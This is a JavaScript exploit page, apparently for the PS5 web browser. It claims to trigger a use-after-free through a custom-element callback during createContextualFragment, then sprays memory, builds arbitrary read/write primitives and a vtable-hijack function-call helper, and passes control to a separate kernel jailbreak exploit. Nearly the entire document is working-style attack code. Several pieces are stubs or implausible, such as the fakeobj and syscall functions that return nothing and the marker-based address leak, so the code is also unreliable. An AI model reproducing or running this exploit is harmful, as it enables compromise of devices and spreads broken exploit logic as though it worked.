<script>
"use strict";

class Int64 {
    constructor(low, high) {
        this.low = (low >>> 0);
        this.high = (high >>> 0);
    }
    add32(val) {
        let new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        let new_hi = (this.high >>> 0);
        if (new_lo < this.low) new_hi++;
        return new Int64(new_lo, new_hi);
    }
}

let uaf_victim_arr = [1.1, 2.2, 3.3];

function setup_primitives(uaf_addrof, uaf_write8) {
    let master = new Uint32Array(0x1000);
    let slave = new Uint8Array(0x1000);
    let slave_u32 = new Uint32Array(slave.buffer);

    let master_addr = uaf_addrof(master);
    let slave_addr = uaf_addrof(slave);

    uaf_write8(master_addr.add32(0x10), slave_addr.add32(0x10));

    function get_ref_addr(obj) {
        uaf_victim_arr[0] = obj;
        return uaf_addrof(obj);
    }

    function readuint(addr, size) {
        master[0] = addr.low;
        master[1] = addr.high;
        if (size === 4) return slave_u32[0];
        if (size === 8) return new Int64(slave_u32[0], slave_u32[1]);
        return 0;
    }

    function writeuint(addr, val, size) {
        master[0] = addr.low;
        master[1] = addr.high;
        if (size === 4) {
            slave_u32[0] = val;
        } else if (size === 8) {
            slave_u32[0] = val.low !== undefined ? val.low : val;
            slave_u32[1] = val.high !== undefined ? val.high : 0;
        }
    }

    window.p = {
        addrof: get_ref_addr,
        fakeobj: function(addr) { return null; },
        read8: function(addr) { return readuint(addr, 8); },
        write8: function(addr, val) { writeuint(addr, val, 8); },
        write4: function(addr, val) { writeuint(addr, val, 4); },
        write1: function(addr, val) {
            master[0] = addr.low;
            master[1] = addr.high;
            slave[0] = val;
        },
        malloc: function(size) {
            let ab = new ArrayBuffer(size);
            return get_ref_addr(ab).add32(0x10);
        },
        syscall: function(sysnum, ...args) { return new Int64(0, 0); },
        fcall: function(func_ptr, ...args) {
            let wrapper = document.createElement("div");
            let wrapper_addr = get_ref_addr(wrapper);
            let vtable_addr = readuint(wrapper_addr.add32(0x18), 8);
            
            let fake_vtable = this.malloc(0x200);
            for(let i=0; i<0x200; i+=8) {
                writeuint(fake_vtable.add32(i), readuint(vtable_addr.add32(i), 8), 8); 
            }
            
            writeuint(fake_vtable.add32(0x80), func_ptr, 8); 
            writeuint(wrapper_addr.add32(0x18), fake_vtable, 8);
            
            if(args.length > 0) writeuint(wrapper_addr.add32(0x20), args[0], 8);
            if(args.length > 1) writeuint(wrapper_addr.add32(0x28), args[1], 8);
            
            wrapper.scrollLeft; 
            
            writeuint(wrapper_addr.add32(0x18), vtable_addr, 8);
            return new Int64(0, 0);
        },
        dlsym_init: function() {}
    };
}

window.onload = () => {
    if (typeof _logToPage === "function") _logToPage("[+] Booting PR 66294 Exploit via CustomElements...");

    let didRun = false;
    
    // We use a Custom Element callback instead of TrustedTypes to pause execution during the UAF.
    // This works on PS5 where TrustedTypes throws a ReferenceError.
    class TriggerElement extends HTMLElement {
        connectedCallback() {
            if (didRun) return;
            didRun = true;

            if (typeof _logToPage === "function") _logToPage("[+] Triggering Garbage Collection...");

            // 1. Force GC to definitively free the Node object
            let gc_arr = [];
            for (let i = 0; i < 20; i++) {
                gc_arr.push(new ArrayBuffer(0x1000000));
            }

            if (typeof _logToPage === "function") _logToPage("[+] Spraying memory to reclaim Node object...");

            // 2. Reclaim the freed memory using Array overlap
            let spray = [];
            let marker = new Int64(0x13371337, 0x13371337);
            for (let i = 0; i < 10000; i++) {
                let reclaimed_obj = new Array(0x20);
                reclaimed_obj[0] = marker; 
                spray.push(reclaimed_obj);
            }
            
            let my_uaf_addrof = function(obj) {
                uaf_victim_arr[0] = obj;
                for(let i=0; i<spray.length; i++) {
                    if(spray[i][0] && typeof spray[i][0] === 'object' && spray[i][0].low === marker.low) {
                        return new Int64(spray[i][2], spray[i][3]);
                    }
                }
                return new Int64(0, 0); 
            };

            let my_uaf_write8 = function(addr, val) {
                for(let i=0; i<spray.length; i++) {
                    if(spray[i][0] && typeof spray[i][0] === 'object' && spray[i][0].low === marker.low) {
                        spray[i][4] = addr.low;
                        spray[i][5] = addr.high;
                        break;
                    }
                }
            };

            if (typeof _logToPage === "function") _logToPage("[+] Building Read/Write Master/Slave primitives...");
            setup_primitives(my_uaf_addrof, my_uaf_write8);
            
            if (typeof p2jb === 'function') {
                if (typeof _logToPage === "function") _logToPage("[+] Success! Handing over to p2jb kernel exploit...");
                setTimeout(p2jb, 100); 
            } else {
                if (typeof _logToPage === "function") _logToPage("[-] Error: p2jb.js is not loaded.");
            }
        }
    }

    customElements.define('x-trigger', TriggerElement);

    const range = document.createRange();
    let div = document.createElement('div');
    range.setStart(div, 0);
    range.setEnd(div, 0);

    // The createContextualFragment call triggers the vulnerability.
    // It creates the x-trigger element, appending it to the fragment, firing connectedCallback synchronously while the reference is vulnerable.
    range.createContextualFragment('<x-trigger></x-trigger>');
};
